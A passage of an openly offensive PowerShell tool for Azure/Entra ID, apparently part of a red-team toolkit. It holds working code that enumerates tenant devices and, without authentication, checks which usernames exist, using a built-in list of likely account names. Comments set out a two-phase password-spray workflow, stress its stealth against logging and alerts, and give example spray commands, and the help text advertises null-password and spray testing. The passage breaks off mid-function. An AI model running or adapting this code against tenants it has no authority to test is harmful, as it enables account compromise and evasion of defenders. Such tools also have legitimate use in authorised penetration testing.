<#
    This file is part of the toolkit EvilMist
    Copyright (C) 2025 Logisek
    https://github.com/Logisek/AZexec

    AZexec - The Azure Execution Tool.

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

    For more see the file 'LICENSE' for copying permission.
#>

<#
.SYNOPSIS
    A PowerShell-based Azure/Entra enumeration tool with netexec-style output.

.DESCRIPTION
    AZX is a PowerShell 7 compatible enumeration tool designed to provide netexec-style 
    output for Azure/Entra ID environments. It queries Microsoft Graph API to enumerate 
    devices, users, and other cloud resources accessible to the current authenticated user.
    
    Current capabilities:
    - Device enumeration from Azure/Entra ID (mimics nxc smb --hosts)
    - Tenant discovery and configuration enumeration (mimics nxc smb --enum)
      * Exposed application IDs and redirect URIs
      * OAuth/OIDC misconfigurations
      * Federation metadata enumeration
      * Security posture assessment
    - Username enumeration (no authentication required, mimics nxc smb --users)
    - Group enumeration from Azure/Entra ID (mimics nxc smb --groups)
    - Password policy enumeration (mimics nxc smb --pass-pol)
      * Password expiration policies
      * MFA/authentication methods
      * Security defaults status
      * Conditional access policies
    - Guest login enumeration (mimics nxc smb -u 'a' -p '')
      * Test if tenant accepts external/B2B authentication
      * Test credentials with empty/null passwords
      * Password spray with single password against user list
      * Detect MFA requirements, locked accounts, expired passwords
    - Active session enumeration (mimics nxc smb --qwinsta)
      * Query Azure AD sign-in logs
      * Display active/recent user sessions
      * Show device, location, IP, application details
      * Identify risky sign-ins and MFA status
    - Netexec-style formatted output
    - Filter by OS, trust type, compliance status
    - Device owner enumeration
    
    Future capabilities (planned):
    - Service principal discovery
    - Role assignments enumeration
    - Advanced group membership analysis

.PARAMETER Command
    The operation to perform. Currently supported:
    - hosts: Enumerate devices from Azure/Entra ID
    - tenant: Discover tenant configuration and endpoints
    - users: Enumerate username existence (no authentication required)
    - user-profiles: Enumerate user profiles with authentication (requires User.Read.All)
    - groups: Enumerate Azure AD groups (authentication required)
    - pass-pol: Enumerate password policies and security defaults (authentication required)
    - guest: Test guest/external authentication (similar to nxc smb -u 'a' -p '')
    - vuln-list: Enumerate vulnerable targets (similar to nxc smb --gen-relay-list)
    - sessions: Enumerate active Windows sessions (similar to nxc smb --qwinsta)

.PARAMETER Domain
    Domain name or tenant ID for tenant discovery. If not provided, the tool will attempt
    to auto-detect the current user's domain from UPN or environment variables.

.PARAMETER Filter
    Optional filter for device enumeration:
    - windows: Only Windows devices
    - azuread: Only Azure AD joined devices
    - hybrid: Only Hybrid joined devices
    - compliant: Only compliant devices
    - noncompliant: Only non-compliant devices
    - disabled: Only disabled devices

.PARAMETER NoColor
    Disable colored output.

.PARAMETER ShowOwners
    Display device owners (slower, makes additional API calls).

.PARAMETER ExportPath
    Optional path to export results to CSV or JSON.

.PARAMETER Scopes
    Microsoft Graph scopes to request. Default: "Device.Read.All"
    You can specify additional scopes as comma-separated values.

.PARAMETER Username
    Single username to check for existence (for 'users' command).

.PARAMETER UserFile
    Path to file containing usernames to check, one per line (for 'users' command).

.PARAMETER CommonUsernames
    Use a built-in list of common usernames (for 'users' command).

.PARAMETER Password
    Password to test for guest authentication (for 'guest' command).
    Use empty string '' for null/guest login testing.

.PARAMETER Hours
    Number of hours to look back for sign-in events (for 'sessions' command).
    Default: 24 hours
    Azure AD retention: 7 days (Free), 30 days (Premium P1/P2)
    Examples: 24 (1 day), 168 (7 days), 720 (30 days)

.EXAMPLE
    .\azx.ps1 hosts
    Enumerate all devices in the Azure/Entra tenant

.EXAMPLE
    .\azx.ps1 hosts -Filter windows
    Enumerate only Windows devices

.EXAMPLE
    .\azx.ps1 hosts -Filter azuread -ShowOwners
    Enumerate Azure AD joined devices with their owners

.EXAMPLE
    .\azx.ps1 hosts -Filter noncompliant -ExportPath devices.csv
    Enumerate non-compliant devices and export to CSV

.EXAMPLE
    .\azx.ps1 hosts -NoColor
    Enumerate devices without colored output

.EXAMPLE
    .\azx.ps1 tenant
    Discover tenant configuration for current user's domain (auto-detected)

.EXAMPLE
    .\azx.ps1 tenant -Domain example.com
    Discover tenant configuration for example.com

.EXAMPLE
    .\azx.ps1 tenant -Domain contoso.onmicrosoft.com -ExportPath tenant-info.json
    Discover tenant configuration and export to JSON

.EXAMPLE
    .\azx.ps1 users -Username alice@example.com
    Check if a single username exists (domain auto-detected)

.EXAMPLE
    .\azx.ps1 users -CommonUsernames
    Check common usernames against your current tenant (domain auto-detected)

.EXAMPLE
    .\azx.ps1 users -Domain example.com -Username alice@example.com
    Check if a single username exists in a specific tenant

.EXAMPLE
    .\azx.ps1 users -Domain example.com -UserFile users.txt
    Check username existence from a file (one username per line)

.EXAMPLE
    .\azx.ps1 users -Domain example.com -CommonUsernames -ExportPath valid-users.csv
    Check common usernames and export valid ones to CSV

.EXAMPLE
    .\azx.ps1 user-profiles
    Enumerate all user profiles in the Azure/Entra tenant (authenticated)

.EXAMPLE
    .\azx.ps1 user-profiles -ExportPath users.csv
    Enumerate user profiles and export to CSV

.EXAMPLE
    .\azx.ps1 user-profiles -ExportPath users.json
    Enumerate user profiles and export to JSON with full details

.EXAMPLE
    .\azx.ps1 groups
    Enumerate all groups in the Azure/Entra tenant

.EXAMPLE
    .\azx.ps1 groups -ExportPath groups.csv
    Enumerate groups and export to CSV

.EXAMPLE
    .\azx.ps1 pass-pol
    Display password policy and security defaults for the tenant

.EXAMPLE
    .\azx.ps1 pass-pol -ExportPath policy.json
    Export password policy information to JSON

.EXAMPLE
    .\azx.ps1 guest -Domain example.com
    Check if tenant accepts guest/external authentication (unauthenticated)

.EXAMPLE
    .\azx.ps1 guest -Domain example.com -Username user -Password ''
    Test null/empty password login (similar to nxc smb -u 'a' -p '')

.EXAMPLE
    .\azx.ps1 guest -Domain example.com -Username alice@example.com -Password 'Summer2024!'
    Test specific credentials for guest authentication

.EXAMPLE
    .\azx.ps1 guest -Domain example.com -UserFile users.txt -Password 'Password123'
    Test multiple usernames with the same password (password spray)

.EXAMPLE
    .\azx.ps1 guest -Domain example.com -UserFile creds.txt
    Test credentials from file (format: username:password per line)

.EXAMPLE
    .\azx.ps1 vuln-list
    Enumerate vulnerable targets in the current tenant (domain auto-detected)

.EXAMPLE
    .\azx.ps1 vuln-list -Domain example.com
    Enumerate vulnerable targets for a specific tenant

.EXAMPLE
    .\azx.ps1 vuln-list -ExportPath relay_targets.txt
    Enumerate vulnerable targets and export HIGH risk items (like nxc --gen-relay-list)

.EXAMPLE
    .\azx.ps1 vuln-list -ExportPath vuln_report.json
    Full vulnerability enumeration with JSON export

.EXAMPLE
    .\azx.ps1 sessions
    Enumerate active sign-in sessions for the last 24 hours (similar to nxc smb --qwinsta)

.EXAMPLE
    .\azx.ps1 sessions -Username alice@example.com
    Enumerate sign-in sessions for a specific user

.EXAMPLE
    .\azx.ps1 sessions -ExportPath sessions.csv
    Enumerate active sessions and export to CSV

.EXAMPLE
    .\azx.ps1 sessions -ExportPath sessions.json
    Enumerate active sessions with full details exported to JSON

.EXAMPLE
    .\azx.ps1 sessions -Hours 168
    Enumerate sign-in sessions for the last 7 days (168 hours)

.EXAMPLE
    .\azx.ps1 sessions -Hours 720 -Username alice@example.com
    Enumerate sessions for a specific user over the last 30 days (requires Premium license)

.NOTES
    Requires PowerShell 7+
    Requires Microsoft.Graph PowerShell module (for 'hosts', 'groups', 'pass-pol', 'sessions', 'vuln-list' commands)
    Requires appropriate Azure/Entra permissions (for authenticated commands)
    The 'tenant' and 'users' commands do not require authentication
    The 'vuln-list' command performs unauthenticated checks first, then authenticated checks
    The 'sessions' command requires AuditLog.Read.All permission
    Guest users may have limited access to groups, policy information, and audit logs
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $true, Position = 0)]
    [ValidateSet("hosts", "tenant", "users", "user-profiles", "groups", "pass-pol", "guest", "vuln-list", "sessions")]
    [string]$Command,
    
    [Parameter(Mandatory = $false)]
    [ValidateSet("windows", "azuread", "hybrid", "compliant", "noncompliant", "disabled", "all")]
    [string]$Filter = "all",
    
    [Parameter(Mandatory = $false)]
    [string]$Domain,
    
    [Parameter(Mandatory = $false)]
    [switch]$NoColor,
    
    [Parameter(Mandatory = $false)]
    [switch]$ShowOwners,
    
    [Parameter(Mandatory = $false)]
    [string]$ExportPath,
    
    [Parameter(Mandatory = $false)]
    [string]$Scopes = "Device.Read.All",
    
    [Parameter(Mandatory = $false)]
    [string]$Username,
    
    [Parameter(Mandatory = $false)]
    [string]$UserFile,
    
    [Parameter(Mandatory = $false)]
    [switch]$CommonUsernames,
    
    [Parameter(Mandatory = $false)]
    [string]$Password,
    
    [Parameter(Mandatory = $false)]
    [int]$Hours = 24
)

# Color output functions
function Write-ColorOutput {
    param(
        [string]$Message,
        [string]$Color = "White"
    )
    
    if ($NoColor) {
        Write-Host $Message
    } else {
        Write-Host $Message -ForegroundColor $Color
    }
}

# Check and import Microsoft.Graph module
function Initialize-GraphModule {
    Write-ColorOutput -Message "[*] Checking Microsoft.Graph module..." -Color "Yellow"
    
    if (-not (Get-Module -ListAvailable -Name Microsoft.Graph.Authentication)) {
        Write-ColorOutput -Message "[!] Microsoft.Graph module not found. Installing..." -Color "Yellow"
        try {
            Install-Module Microsoft.Graph -Scope CurrentUser -Force -AllowClobber
            Write-ColorOutput -Message "[+] Microsoft.Graph module installed successfully" -Color "Green"
        } catch {
            Write-ColorOutput -Message "[!] Failed to install Microsoft.Graph module: $_" -Color "Red"
            exit 1
        }
    }
    
    try {
        Import-Module Microsoft.Graph.Authentication -ErrorAction Stop
        Import-Module Microsoft.Graph.Identity.DirectoryManagement -ErrorAction Stop
    } catch {
        Write-ColorOutput -Message "[!] Failed to import Microsoft.Graph modules: $_" -Color "Red"
        exit 1
    }
}

# Check if current user is a guest
function Test-IsGuestUser {
    param(
        [string]$UserPrincipalName
    )
    
    try {
        # Get the current user's details from Microsoft Graph
        $currentUser = Get-MgUser -UserId $UserPrincipalName -ErrorAction SilentlyContinue
        
        if ($currentUser) {
            # Check if userType is Guest
            if ($currentUser.UserType -eq "Guest") {
                return $true
            }
            
            # Also check if UPN contains #EXT# (external user marker)
            if ($UserPrincipalName -like "*#EXT#*") {
                return $true
            }
        }
    } catch {
        # If we can't determine, assume not guest
        return $false
    }
    
    return $false
}

# Connect to Microsoft Graph
function Connect-GraphAPI {
    param(
        [string]$Scopes
    )
    
    Write-ColorOutput -Message "[*] Connecting to Microsoft Graph..." -Color "Yellow"
    
    try {
        $scopeArray = $Scopes -split ','
        
        # Check if already connected
        $context = Get-MgContext
        if ($context) {
            Write-ColorOutput -Message "[+] Already connected to tenant: $($context.TenantId)" -Color "Green"
            Write-ColorOutput -Message "[+] Account: $($context.Account)" -Color "Green"
            
            # Check if user is a guest
            $isGuest = Test-IsGuestUser -UserPrincipalName $context.Account
            if ($isGuest) {
                Write-ColorOutput -Message "`n[!] GUEST USER DETECTED" -Color "Yellow"
                Write-ColorOutput -Message "[*] You are authenticated as a GUEST/EXTERNAL user" -Color "Yellow"
                Write-ColorOutput -Message "[*] This is the Azure equivalent of a 'null session' - low-privileged enumeration" -Color "Cyan"
                Write-ColorOutput -Message "[*] Many organizations do NOT restrict guest permissions properly" -Color "Cyan"
                Write-ColorOutput -Message "[*] This is a LOW-NOISE reconnaissance technique`n" -Color "Green"
            }
        } else {
            Connect-MgGraph -Scopes $scopeArray -ErrorAction Stop
            $context = Get-MgContext
            Write-ColorOutput -Message "[+] Connected to tenant: $($context.TenantId)" -Color "Green"
            Write-ColorOutput -Message "[+] Account: $($context.Account)" -Color "Green"
            
            # Check if user is a guest
            $isGuest = Test-IsGuestUser -UserPrincipalName $context.Account
            if ($isGuest) {
                Write-ColorOutput -Message "`n[!] GUEST USER DETECTED" -Color "Yellow"
                Write-ColorOutput -Message "[*] You are authenticated as a GUEST/EXTERNAL user" -Color "Yellow"
                Write-ColorOutput -Message "[*] This is the Azure equivalent of a 'null session' - low-privileged enumeration" -Color "Cyan"
                Write-ColorOutput -Message "[*] Many organizations do NOT restrict guest permissions properly" -Color "Cyan"
                Write-ColorOutput -Message "[*] This is a LOW-NOISE reconnaissance technique`n" -Color "Green"
            }
        }
    } catch {
        Write-ColorOutput -Message "[!] Failed to connect to Microsoft Graph: $_" -Color "Red"
        exit 1
    }
}

# Format device output like netexec
function Format-DeviceOutput {
    param(
        [PSCustomObject]$Device,
        [string]$Owner = $null
    )
    
    # Parse OS and version info
    $osName = if ($Device.OperatingSystem) { 
        $Device.OperatingSystem -replace "Windows ", "Win" 
    } else { 
        "Unknown" 
    }
    
    $osVersion = if ($Device.OperatingSystemVersion) { 
        $Device.OperatingSystemVersion 
    } else { 
        "0" 
    }
    
    # Determine trust type/join type
    $joinType = switch ($Device.TrustType) {
        "AzureAd" { "AzureAD" }
        "ServerAd" { "Hybrid" }
        "Workplace" { "Workplace" }
        default { $Device.TrustType }
    }
    
    # Compliance and status
    $compliant = if ($Device.IsCompliant) { "True" } else { "False" }
    $enabled = if ($Device.AccountEnabled) { "True" } else { "False" }
    
    # Format output similar to netexec SMB output
    $deviceName = if ($Device.DisplayName) { $Device.DisplayName } else { "UNKNOWN" }
    
    # Truncate long device names for column display (but show full name in details)
    $maxNameLength = 35
    $displayName = if ($deviceName.Length -gt $maxNameLength) {
        $deviceName.Substring(0, $maxNameLength - 3) + "..."
    } else {
        $deviceName
    }
    
    # Use device ID as "IP" equivalent (first 15 chars for alignment)
    $deviceIdShort = if ($Device.DeviceId) { 
        $Device.DeviceId.Substring(0, [Math]::Min(15, $Device.DeviceId.Length))
    } else { 
        "UNKNOWN-ID" 
    }
    
    $output = "AZR".PadRight(12) + 
              $deviceIdShort.PadRight(17) + 
              "443".PadRight(7) + 
              $displayName.PadRight(38) + 
              "[*] $osName $osVersion (name:$deviceName) (trust:$joinType) (compliant:$compliant) (enabled:$enabled)"
    
    if ($Owner) {
        $output += " (owner:$Owner)"
    }
    
    # Color based on status
    $color = "Cyan"
    if (-not $Device.AccountEnabled) {
        $color = "DarkGray"
    } elseif (-not $Device.IsCompliant) {
        $color = "Yellow"
    }
    
    Write-ColorOutput -Message $output -Color $color
}

# Get device owners
function Get-DeviceOwners {
    param(
        [string]$DeviceId
    )
    
    try {
        $owners = Get-MgDeviceRegisteredOwner -DeviceId $DeviceId -ErrorAction SilentlyContinue
        if ($owners) {
            $ownerNames = @()
            foreach ($owner in $owners) {
                if ($owner.AdditionalProperties.userPrincipalName) {
                    $ownerNames += $owner.AdditionalProperties.userPrincipalName
                }
            }
            return ($ownerNames -join ", ")
        }
    } catch {
        return $null
    }
    
    return $null
}

# Filter devices based on criteria
function Get-FilteredDevices {
    param(
        [array]$Devices,
        [string]$Filter
    )
    
    switch ($Filter) {
        "windows" {
            return $Devices | Where-Object { $_.OperatingSystem -like "Windows*" }
        }
        "azuread" {
            return $Devices | Where-Object { $_.TrustType -eq "AzureAd" }
        }
        "hybrid" {
            return $Devices | Where-Object { $_.TrustType -eq "ServerAd" }
        }
        "compliant" {
            return $Devices | Where-Object { $_.IsCompliant -eq $true }
        }
        "noncompliant" {
            return $Devices | Where-Object { $_.IsCompliant -eq $false }
        }
        "disabled" {
            return $Devices | Where-Object { $_.AccountEnabled -eq $false }
        }
        default {
            return $Devices
        }
    }
}

# Main host enumeration function
function Invoke-HostEnumeration {
    param(
        [string]$Filter,
        [bool]$ShowOwners,
        [string]$ExportPath
    )
    
    Write-ColorOutput -Message "`n[*] AZX - Azure/Entra Enumeration Tool" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: Host Enumeration" -Color "Yellow"
    Write-ColorOutput -Message "[*] Filter: $Filter`n" -Color "Yellow"
    
    # Get all devices
    Write-ColorOutput -Message "[*] Retrieving devices from Azure/Entra ID..." -Color "Yellow"
    
    try {
        $allDevices = Get-MgDevice -All -ErrorAction Stop
        Write-ColorOutput -Message "[+] Retrieved $($allDevices.Count) total devices`n" -Color "Green"
    } catch {
        Write-ColorOutput -Message "[!] Failed to retrieve devices: $_" -Color "Red"
        Write-ColorOutput -Message "[!] Ensure you have Device.Read.All permissions" -Color "Red"
        return
    }
    
    # Apply filter
    $devices = Get-FilteredDevices -Devices $allDevices -Filter $Filter
    
    if ($devices.Count -eq 0) {
        Write-ColorOutput -Message "[!] No devices found matching filter: $Filter" -Color "Red"
        return
    }
    
    Write-ColorOutput -Message "[*] Displaying $($devices.Count) devices after filtering`n" -Color "Green"
    
    # Prepare export data
    $exportData = @()
    
    # Enumerate devices
    foreach ($device in $devices) {
        $owner = $null
        if ($ShowOwners) {
            $owner = Get-DeviceOwners -DeviceId $device.Id
        }
        
        Format-DeviceOutput -Device $device -Owner $owner
        
        # Collect for export
        if ($ExportPath) {
            $exportData += [PSCustomObject]@{
                DeviceId             = $device.DeviceId
                DisplayName          = $device.DisplayName
                OperatingSystem      = $device.OperatingSystem
                OperatingSystemVersion = $device.OperatingSystemVersion
                TrustType            = $device.TrustType
                IsCompliant          = $device.IsCompliant
                AccountEnabled       = $device.AccountEnabled
                ApproximateLastSignInDateTime = $device.ApproximateLastSignInDateTime
                RegisteredOwners     = $owner
            }
        }
    }
    
    # Export if requested
    if ($ExportPath) {
        try {
            $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
            
            if ($extension -eq ".csv") {
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -Force
            } elseif ($extension -eq ".json") {
                $exportData | ConvertTo-Json -Depth 5 | Out-File -FilePath $ExportPath -Force
            } else {
                # Default to CSV
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -Force
            }
            
            Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
        } catch {
            Write-ColorOutput -Message "`n[!] Failed to export results: $_" -Color "Red"
        }
    }
    
    Write-ColorOutput -Message "`n[*] Enumeration complete!" -Color "Green"
    
    # Display summary statistics
    Write-ColorOutput -Message "`n[*] Summary:" -Color "Yellow"
    Write-ColorOutput -Message "    Total Devices: $($devices.Count)" -Color "Cyan"
    
    $windowsCount = ($devices | Where-Object { $_.OperatingSystem -like "Windows*" }).Count
    $azureAdCount = ($devices | Where-Object { $_.TrustType -eq "AzureAd" }).Count
    $hybridCount = ($devices | Where-Object { $_.TrustType -eq "ServerAd" }).Count
    $compliantCount = ($devices | Where-Object { $_.IsCompliant -eq $true }).Count
    $enabledCount = ($devices | Where-Object { $_.AccountEnabled -eq $true }).Count
    
    Write-ColorOutput -Message "    Windows Devices: $windowsCount" -Color "Cyan"
    Write-ColorOutput -Message "    Azure AD Joined: $azureAdCount" -Color "Cyan"
    Write-ColorOutput -Message "    Hybrid Joined: $hybridCount" -Color "Cyan"
    Write-ColorOutput -Message "    Compliant: $compliantCount" -Color "Cyan"
    Write-ColorOutput -Message "    Enabled: $enabledCount" -Color "Cyan"
}

# Common usernames list
function Get-CommonUsernames {
    param(
        [string]$Domain
    )
    
    # Common username patterns
    $commonNames = @(
        # Administrative accounts
        "admin",
        "administrator",
        "root",
        "sysadmin",
        "sa",
        "sql",
        "dba",
        "dbadmin",
        "dbmanager",
        "dbowner",
        "dbroot",
        "dbadmin",
        "dbmanager",
        "dbowner",
        "dbroot",
        
        # Support and helpdesk
        "support",
        "helpdesk",
        "servicedesk",
        "itadmin",
        "itsupport",
        "ithelp",
        "ithelper",
        
        # Security and compliance
        "security",
        "cybersecurity",
        "infosec",
        "secops",
        "dpo",
        "compliance",
        "privacy",
        "privacyofficer",
        
        # Business departments
        "accounting",
        "finance",
        "billing",
        "payroll",
        "invoices",
        "accounts",
        "hr",
        "humanresources",
        "recruitment",
        "sales",
        "marketing",
        "legal",
        "contracts",
        "contractsmanager",        
        
        # Communications
        "info",
        "contact",
        "hello",
        "noreply",
        "no-reply",
        "donotreply",
        "mailer",
        "postmaster",
        "webmaster",
        "notifications",
        "alerts",
        "social",
        "supportemail",
        
        # Web and portal accounts
        "webadmin",
        "webmail",
        "portal",
        "mail",
        "smtp",
        "imap",
        "help",
        
        # IT and operations
        "it",
        "dev",
        "developer",
        "ops",
        "devops",
        "sysops",
        "operations",
        "infrastructure",
        "network",
        "monitoring",
        "logs",
        "logging",
        "internal",
        "intranet",        
        
        # Service accounts
        "service",
        "backup",
        "reports",
        "reporting",
        "automation",
        "api",
        "webhook",
        
        # Testing and demo
        "test",
        "testing",
        "demo",
        "guest",
        "user",
        "users",
        
        # Executive accounts
        "ceo",
        "cfo",
        "cto",
        "cio",
        "cso",
        "ciso"
    )
    
    # Generate usernames with domain
    $usernames = @()
    foreach ($name in $commonNames) {
        $usernames += "$name@$Domain"
    }
    
    return $usernames
}

# Check username existence using GetCredentialType API
# ============================================
# PASSWORD SPRAY ATTACK WORKFLOW
# ============================================
# This function is Phase 1 of a two-phase password spray attack:
#
# PHASE 1: Username Enumeration (this function, called by 'users' command)
#   - Uses Microsoft's public GetCredentialType API
#   - No authentication required
#   - Does NOT trigger authentication logs (stealthy!)
#   - Validates which usernames exist in the tenant
#   - Returns authentication type (Managed/Federated/Alternate)
#
# PHASE 2: Password Spraying (Test-GuestAuthentication function, called by 'guest' command)
#   - Uses ROPC (Resource Owner Password Credentials) OAuth2 flow
#   - Tests actual username/password combinations
#   - Detects MFA requirements, account lockouts, password expiration
#   - Generates authentication logs (moderate stealth)
#
# WHY TWO PHASES?
#   1. GetCredentialType only validates usernames (not passwords)
#   2. Spraying only validated usernames reduces account lockout risk
#   3. Separating enumeration from auth testing improves OPSEC
#   4. Can test 100s of usernames quickly without triggering alerts
#
# EXAMPLE WORKFLOW:
#   Step 1: .\azx.ps1 users -Domain target.com -CommonUsernames -ExportPath valid-users.csv
#   Step 2: $validUsers = Import-Csv valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username
#   Step 3: $validUsers | Out-File spray-targets.txt
#   Step 4: .\azx.ps1 guest -Domain target.com -UserFile spray-targets.txt -Password 'Summer2024!' -ExportPath spray-results.json
#
# ============================================
function Test-UsernameExistence {
    param(
        [string]$Username
    )
    
    try {
        $body = @{
            username = $Username
        } | ConvertTo-Json
        
        $response = Invoke-RestMethod `
            -Method POST `
            -Uri "https://login.microsoftonline.com/common/GetCredentialType" `
            -ContentType "application/json" `
            -Body $body `
            -ErrorAction Stop
        
        # Parse response
        $result = [PSCustomObject]@{
            Username = $Username
            Exists = $false
            IfExistsResult = $null
            ThrottleStatus = $null
            EstsProperties = $null
        }
        
        # IfExistsResult values:
        # 0 = User exists
        # 1 = User does not exist
        # 5 = User exists (different authentication)
        # 6 = User exists (federated)
        
        if ($response.IfExistsResult -ne $null) {
            $result.IfExistsResult = $response.IfExistsResult
            
            if ($response.IfExistsResult -eq 0 -or 
                $response.IfExistsResult -eq 5 -or 
                $response.IfExistsResult -eq 6) {
                $result.Exists = $true
            }
        }
        
        $result.ThrottleStatus = $response.ThrottleStatus
        $result.EstsProperties = $response.EstsProperties
        
        return $result
        
    } catch {
        # If we get an error, return null to indicate the check failed
        return $null
    }
}

# Format username enumeration output like netexec
function Format-UsernameOutput {
    param(
        [string]$Domain,
        [string]$Username,
        [PSCustomObject]$Result
    )
    
    if ($null -eq $Result) {
        # Check failed (network error, etc.)
        $output = "AZR".PadRight(12) + 
                  $Domain.PadRight(35) + 
                  "443".PadRight(7) + 
                  $Username.PadRight(38) + 
                  "[!] Check failed"
        Write-ColorOutput -Message $output -Color "Red"
        return
    }
    
    # Format output
    $username = $Result.Username
    $maxUsernameLength = 35
    $displayUsername = if ($username.Length -gt $maxUsernameLength) {
        $username.Substring(0, $maxUsernameLength - 3) + "..."
    } else {
        $username
    }
    
    if ($Result.Exists) {
        # User exists
        $status = switch ($Result.IfExistsResult) {
            0 { "[+] Valid username (Managed)" }
            5 { "[+] Valid username (Alternate auth)" }
            6 { "[+] Valid username (Federated)" }
            default { "[+] Valid username" }
        }
        
        $output = "AZR".PadRight(12) + 
                  $Domain.PadRight(35) + 
                  "443".PadRight(7) + 
                  $displayUsername.PadRight(38) + 
                  $status
        
        Write-ColorOutput -Message $output -Color "Green"
    } else {
        # User does not exist
        $output = "AZR".PadRight(12) + 
                  $Domain.PadRight(35) + 
                  "443".PadRight(7) + 
                  $displayUsername.PadRight(38) + 
                  "[-] Invalid username"
        
        Write-ColorOutput -Message $output -Color "DarkGray"
    }
}

# Main user enumeration function
function Invoke-UserEnumeration {
    param(
        [string]$Domain,
        [string]$Username,
        [string]$UserFile,
        [bool]$CommonUsernames,
        [string]$ExportPath
    )
    
    # Validate that at least one input method is provided
    if (-not $Username -and -not $UserFile -and -not $CommonUsernames) {
        Write-ColorOutput -Message "[!] Please provide one of: -Username, -UserFile, or -CommonUsernames" -Color "Red"
        Write-ColorOutput -Message "[*] Examples (domain is optional and will be auto-detected if not provided):" -Color "Yellow"
        Write-ColorOutput -Message "    .\azx.ps1 users -Username alice@example.com" -Color "Yellow"
        Write-ColorOutput -Message "    .\azx.ps1 users -CommonUsernames" -Color "Yellow"
        Write-ColorOutput -Message "    .\azx.ps1 users -Domain example.com -UserFile users.txt" -Color "Yellow"
        return
    }
    
    # Auto-detect domain if not provided
    if (-not $Domain) {
        Write-ColorOutput -Message "[*] No domain specified, attempting to auto-detect..." -Color "Yellow"
        
        $detectedDomain = $null
        
        try {
            if ($IsWindows -or $PSVersionTable.PSVersion.Major -le 5) {
                $upn = whoami /upn 2>$null
                if ($upn -and $upn -match '@(.+)$') {
                    $detectedDomain = $matches[1]
                }
            }
            
            if (-not $detectedDomain) {
                $envDomain = [System.Environment]::GetEnvironmentVariable("USERDNSDOMAIN")
                if ($envDomain) {
                    $detectedDomain = $envDomain
                }
            }
        } catch {
            # Silent catch
        }
        
        if ($detectedDomain) {
            $Domain = $detectedDomain
            Write-ColorOutput -Message "[+] Using auto-detected domain: $Domain`n" -Color "Green"
        } else {
            Write-ColorOutput -Message "[!] Could not auto-detect domain" -Color "Red"
            Write-ColorOutput -Message "[!] Please provide the domain using: -Domain example.com" -Color "Yellow"
            return
        }
    }
    
    Write-ColorOutput -Message "`n[*] AZX - Azure/Entra Username Enumeration" -Color "Yellow"
    Write-ColorOutput -Message "[*] Target Domain: $Domain" -Color "Yellow"
    Write-ColorOutput -Message "[*] Method: GetCredentialType API (No authentication required)`n" -Color "Yellow"
    
    # Build username list
    $usernames = @()
    
    if ($Username) {
        # Single username
        # If username doesn't contain @, append domain
        if ($Username -notlike "*@*") {
            $Username = "$Username@$Domain"
        }
        $usernames += $Username
        Write-ColorOutput -Message "[*] Checking single username: $Username`n" -Color "Yellow"
    }
    
    if ($UserFile) {
        # Read from file
        if (-not (Test-Path $UserFile)) {
            Write-ColorOutput -Message "[!] User file not found: $UserFile" -Color "Red"
            return
        }
        
        try {
            $fileUsernames = Get-Content $UserFile -ErrorAction Stop
            foreach ($user in $fileUsernames) {
                $user = $user.Trim()
                if ($user -and $user -notlike "#*") {  # Skip empty lines and comments
                    # If username doesn't contain @, append domain
                    if ($user -notlike "*@*") {
                        $user = "$user@$Domain"
                    }
                    $usernames += $user
                }
            }
            Write-ColorOutput -Message "[*] Loaded $($usernames.Count) usernames from file: $UserFile`n" -Color "Green"
        } catch {
            Write-ColorOutput -Message "[!] Failed to read user file: $_" -Color "Red"
            return
        }
    }
    
    if ($CommonUsernames) {
        # Use common usernames
        $commonUsers = Get-CommonUsernames -Domain $Domain
        $usernames += $commonUsers
        Write-ColorOutput -Message "[*] Using $($commonUsers.Count) common usernames`n" -Color "Yellow"
    }
    
    if ($usernames.Count -eq 0) {
        Write-ColorOutput -Message "[!] No usernames to check" -Color "Red"
        return
    }
    
    Write-ColorOutput -Message "[*] Checking $($usernames.Count) username(s)...`n" -Color "Yellow"
    
    # Check each username
    $results = @()
    $validUsers = @()
    $checkedCount = 0
    
    foreach ($user in $usernames) {
        $result = Test-UsernameExistence -Username $user
        Format-UsernameOutput -Domain $Domain -Username $user -Result $result
        
        if ($result -and $result.Exists) {
            $validUsers += $result
        }
        
        $results += $result
        $checkedCount++
        
        # Small delay to avoid throttling (50ms)
        Start-Sleep -Milliseconds 50
    }
    
    # Summary
    Write-ColorOutput -Message "`n[*] Username enumeration complete!" -Color "Green"
    Write-ColorOutput -Message "`n[*] Summary:" -Color "Yellow"
    Write-ColorOutput -Message "    Total Checked: $checkedCount" -Color "Cyan"
    Write-ColorOutput -Message "    Valid Users:   $($validUsers.Count)" -Color "Green"
    Write-ColorOutput -Message "    Invalid Users: $($checkedCount - $validUsers.Count)" -Color "DarkGray"
    
    # Export if requested
    if ($ExportPath) {
        try {
            $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
            
            $exportData = @()
            foreach ($result in $results) {
                if ($result) {
                    $exportData += [PSCustomObject]@{
                        Username = $result.Username
                        Exists = $result.Exists
                        IfExistsResult = $result.IfExistsResult
                        AuthType = switch ($result.IfExistsResult) {
                            0 { "Managed" }
                            5 { "Alternate" }
                            6 { "Federated" }
                            default { "Unknown" }
                        }
                        ThrottleStatus = $result.ThrottleStatus
                    }
                }
            }
            
            if ($extension -eq ".csv") {
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -Force
            } elseif ($extension -eq ".json") {
                $exportData | ConvertTo-Json -Depth 5 | Out-File -FilePath $ExportPath -Force
            } else {
                # Default to CSV
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -Force
            }
            
            Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
        } catch {
            Write-ColorOutput -Message "`n[!] Failed to export results: $_" -Color "Red"
        }
    }
    
    # Display valid usernames
